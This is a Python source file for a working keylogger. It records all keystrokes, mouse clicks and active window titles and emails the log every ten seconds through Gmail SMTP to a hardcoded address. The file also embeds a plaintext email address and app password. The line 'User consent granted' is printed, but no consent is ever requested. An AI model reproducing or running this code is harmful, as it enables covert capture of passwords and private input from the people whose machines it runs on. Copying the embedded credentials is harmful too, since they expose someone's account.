# main.py
import threading
import time
from pynput import keyboard, mouse
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# ----------------- CONFIG -----------------
LOG_FILE = "activity_log.txt"
stop_flag = False  # Global flag to stop threads

EMAIL_SENDER = "unnati.singhal2025@vitstudent.ac.in"
EMAIL_PASSWORD = "iopo liuf eaae allb"
EMAIL_RECEIVER = "unnati.singhal2025@vitstudent.ac.in"
EMAIL_INTERVAL = 10  # seconds for testing; change to 60 for normal

# ----------------- Logging -----------------
def log_event(event):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {event}\n")
            f.flush()
    except UnicodeEncodeError:
        safe_event = event.encode("utf-8", errors="replace").decode("utf-8")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {safe_event}\n")
            f.flush()

# ----------------- Input Logger -----------------
def input_listener():
    def on_key_press(key):
        log_event(f"Keyboard: {key}")

    def on_click(x, y, button, pressed):
        if pressed:
            log_event(f"Mouse click at ({x}, {y}) - {button}")

    with keyboard.Listener(on_press=on_key_press) as kl, \
         mouse.Listener(on_click=on_click) as ml:
        while not stop_flag:
            time.sleep(0.1)
        kl.stop()
        ml.stop()

# ----------------- Active Window Tracker -----------------
def window_tracker():
    last_window = None
    while not stop_flag:
        try:
            if os.name == "nt":
                import win32gui
                window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            else:
                import subprocess
                window = subprocess.getoutput("xdotool getwindowfocus getwindowname")
        except Exception:
            window = "Unknown"

        if window != last_window:
            log_event(f"Active window: {window}")
            last_window = window
        time.sleep(2)

# ----------------- Email Sender -----------------
def email_scheduler():
    print("Email scheduler thread started")  # Debug
    while not stop_flag:
        time.sleep(EMAIL_INTERVAL)
        try:
            if not os.path.exists(LOG_FILE):
                print("Log file not found, skipping email.")
                continue

            # Read log content
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                log_content = f.read()

            if not log_content.strip():
                # Skip if log is empty
                continue

            # Create email
            msg = MIMEMultipart()
            msg['From'] = EMAIL_SENDER
            msg['To'] = EMAIL_RECEIVER
            msg['Subject'] = f"Activity Log - {time.strftime('%Y-%m-%d %H:%M:%S')}"
            msg.attach(MIMEText(log_content, "plain"))

            # Attach log file
            part = MIMEBase('application', 'octet-stream')
            with open(LOG_FILE, 'rb') as f:
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{LOG_FILE}"')
            msg.attach(part)

            # Send email
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.set_debuglevel(1)  # SMTP debug
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                server.send_message(msg)

            print(f"Email sent successfully at {time.strftime('%H:%M:%S')}")

            # Clear log file after sending
            with open(LOG_FILE, "w", encoding="utf-8") as f:
                f.truncate(0)

        except Exception as e:
            print(f"Failed to send email: {repr(e)}")


# ----------------- Main -----------------
def main():
    global stop_flag
    # Ensure working directory is script folder
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    print("User consent granted. Activity logger started.")

    # Start threads
    t_input = threading.Thread(target=input_listener)
    t_window = threading.Thread(target=window_tracker)
    t_email = threading.Thread(target=email_scheduler)

    t_input.start()
    t_window.start()
    t_email.start()

    try:
        while True:
            time.sleep(1)  # Keep main thread alive
    except KeyboardInterrupt:
        print("\nStopping activity logger gracefully...")
        stop_flag = True
        t_input.join()
        t_window.join()
        t_email.join()
        print(f"Logs saved in {LOG_FILE}")
        print("Activity logger stopped.")

if __name__ == "__main__":
    main()
